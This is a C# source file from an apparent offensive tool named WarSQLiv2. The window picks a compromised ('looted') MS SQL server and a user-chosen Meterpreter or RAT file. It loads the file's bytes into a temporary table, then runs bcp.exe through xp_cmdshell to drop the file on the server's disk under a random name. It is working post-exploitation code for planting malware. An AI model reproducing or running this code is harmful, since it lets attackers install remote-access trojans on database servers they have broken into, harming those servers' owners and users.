using System;
using System.IO;
using System.Linq;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Forms;
using System.Windows.Threading;
using WarSQLiv2.Exploitation.Control;
using WarSQLiv2.Exploitation.PostExploitation;

namespace WarSQLiv2.UserControls.Attack.MSSQL
{
    /// <summary>
    /// Interaction logic for FrmSendFileToMsSqlServer.xaml
    /// </summary>
    public partial class FrmSendFileToMsSqlServer : Window
    {
        private readonly LanguageControl _languageControl = new LanguageControl();
        public xpCmdShellControl cmdControl = new xpCmdShellControl();
        readonly MsSqlPostExploitation _postExploitation = new MsSqlPostExploitation();
        private int _selectedId = 0;
        public FrmSendFileToMsSqlServer()
        {
            InitializeComponent();
        }
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            _languageControl.FindLang();
            var lootedFileControl = new LootedFileControl();
            try
            {
                Dispatcher.Invoke((Action)delegate
                {
                    btnSelectFile.Content = _languageControl.SelectedLanguage.GetString("ButtonSelectFile");
                    btnUpload.Content = _languageControl.SelectedLanguage.GetString("ButtonUpload");
                    lblDetails.Content = _languageControl.SelectedLanguage.GetString("LabelDetails");
                    lblLooted.Content = _languageControl.SelectedLanguage.GetString("GroupBoxLooted");
                    Title = _languageControl.SelectedLanguage.GetString("TitleSendFileToMsSqlServer");
                    lootedFileControl.FileControl();
                    var lootedList = lootedFileControl.LootedList;
                    foreach (var t in lootedList)
                    {
                        lstLooted.Items.Add(t);
                    }

                    lstLooted.SelectedIndex = 0;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = string.Empty;
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });

            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(lootedFileControl.Exception);
                });
            }
        }
        private void lstLooted_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                Dispatcher.Invoke((Action)delegate
                {
                    _selectedId = 0;
                    _selectedId = lstLooted.SelectedIndex;
                    lblStrip.Content = string.Empty;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });

            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                });

            }
        }
        private void btnSelectFile_Click(object sender, RoutedEventArgs e)
        {
            Dispatcher.Invoke((Action)delegate
            {
                try
                {
                    var file = new System.Windows.Forms.OpenFileDialog
                    {
                        InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                        Title = @"Please Select Meterpreter or RAT File"
                    };
                    DialogResult sdg = file.ShowDialog();
                    if (sdg == System.Windows.Forms.DialogResult.OK)
                    {
                        txtSelectFile.Text = file.FileName;
                    }

                }
                catch (Exception exp)
                {
                    txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                }
            });            
        }
        private void btnUpload_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                    _postExploitation.CreateBinaryTable();
                    txtStatus.AppendText(_postExploitation.ExploitResult);

                    
                    _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                    _postExploitation.BinaryData = File.ReadAllBytes(txtSelectFile.Text);
                    _postExploitation.InsertBinaryData();
                    txtStatus.AppendText(_postExploitation.ExploitResult);
                });
            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                });
            }

            try
            {
                _postExploitation.ExploitCode = string.Empty;
                var rnd = new Random();
                var chr = "0123456789ABCDEFGHIJKLMNOPRSTUVWXYZ".ToCharArray();
                var randomFileName = string.Empty;
                for (int i = 0; i < 12; i++)
                {
                    randomFileName += chr[rnd.Next(0, chr.Length - 1)].ToString();
                }
                var path = txtSelectFile.Text.Split('.');
                var pathCount = (path.Count() - 1);
                _postExploitation.ExploitCode += "DECLARE @cmd  VARCHAR(8000);";
                _postExploitation.ExploitCode += "SET @cmd = 'bcp.exe \"SELECT CAST(binaryTable AS VARCHAR(MAX)) FROM WarSQLiTemp\" queryout \"" + txtPath.Text + "\\" + randomFileName + "." + path[pathCount] + "\" -c -T';";
                _postExploitation.ExploitCode += "EXEC xp_cmdshell  @cmd;";           
                
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                    _postExploitation.RunExploit();
                    txtStatus.AppendText(_postExploitation.ExploitResult);
                    txtStatus.AppendText("File Saved: " + txtPath.Text + "\\" + randomFileName + "." + path[pathCount]);
                });
            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                });
            }
        }
    }
}
